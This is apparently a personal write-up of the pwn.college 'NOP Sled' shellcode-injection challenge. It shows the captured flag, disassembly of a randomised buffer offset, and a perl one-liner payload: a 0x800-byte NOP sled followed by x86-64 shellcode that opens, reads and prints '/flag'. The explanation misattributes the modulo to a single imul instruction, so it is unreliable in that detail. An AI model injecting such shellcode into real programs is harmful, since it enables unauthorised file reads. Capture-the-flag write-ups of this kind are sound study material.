---
Platform: Pwn College
Tittle: NOP Sled
Date & Tme: 2026 - 09 - 07 10:23
tags:
  - Challenge
  - BinaryExploitation
  - ShellcodeInjection
---
---
## FLAG : `pwn.college{MWYjEJtzjc1hdY-4I2QSIljuhu6.dhTMywiN4kDOyEzW}`

---
## Solution :

This file challenge is same as [[Basic Shellcode]], but the only difference is this line : 
```asm
   0x0000000000001845 <+670>:	call   0x1250 <rand@plt>
   0x000000000000184a <+675>:	movsxd rdx,eax
   0x000000000000184d <+678>:	imul   rdx,rdx,0xffffffff92492493
   0x0000000000001854 <+685>:	shr    rdx,0x20
   0x0000000000001858 <+689>:	add    edx,eax
   0x000000000000185a <+691>:	mov    ecx,edx
   0x000000000000185c <+693>:	sar    ecx,0xa
   0x000000000000185f <+696>:	cdq
   0x0000000000001860 <+697>:	sub    ecx,edx
   0x0000000000001862 <+699>:	mov    edx,ecx
   0x0000000000001864 <+701>:	imul   edx,edx,0x700
   0x000000000000186a <+707>:	sub    eax,edx
   0x000000000000186c <+709>:	mov    edx,eax
   0x000000000000186e <+711>:	lea    eax,[rdx+0x100]
   0x0000000000001874 <+717>:	mov    DWORD PTR [rbp-0x1024],eax
   0x000000000000187a <+723>:	mov    rdx,QWORD PTR [rip+0x27b7]        # 0x4038 <shellcode>
   0x0000000000001881 <+730>:	mov    eax,DWORD PTR [rbp-0x1024]
   0x0000000000001887 <+736>:	cdqe
   0x0000000000001889 <+738>:	add    rax,rdx
   0x000000000000188c <+741>:	mov    QWORD PTR [rip+0x27a5],rax        # 0x4038 <shellcode>
```

This section will call a randomizer, and generate some random number and save it to `rdx`.
Then some operation applied on `rdx` (in this case, it use edx because the upper half, is 0 because of `shr rdx,0x20`). `imul edx,edx,0x700`, this operation is same as `edx % 0x700`, so it is guaranteed that the value of `rdx` will be 0 to 0x700. Next, the random number value will be add by `0x100` then add into `rax`.  Then our buffer length, will be shrinked by `rax`. 

To solve this problem, we need a buffer with minimal `0x800 + ShellCode` Length.

Payload : 
```shell
perl -e 'print "\x90"x0x800 . "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00"'
```

---
### Key Takeaways : 
- `\x90` is NOP Sled byte,
- NOP stands for `NO Operation`, it mean it doesn't do anything when executed
